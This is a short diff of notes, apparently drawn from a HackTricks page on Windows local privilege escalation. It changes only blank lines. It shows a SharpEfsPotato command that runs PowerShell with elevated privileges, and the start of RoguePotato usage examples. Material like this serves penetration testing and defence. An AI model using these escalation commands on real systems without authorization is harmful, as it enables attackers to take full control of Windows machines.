@@ -1,6 +1,5 @@
 https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
 ## SharpEfsPotato
-
 ```
 SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
 ```
@@ -16,7 +15,6 @@ However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePota
 
 https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
 ## RoguePotato
-
 ```
 Examples:
  - RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. Use this if you have fw restrictions.
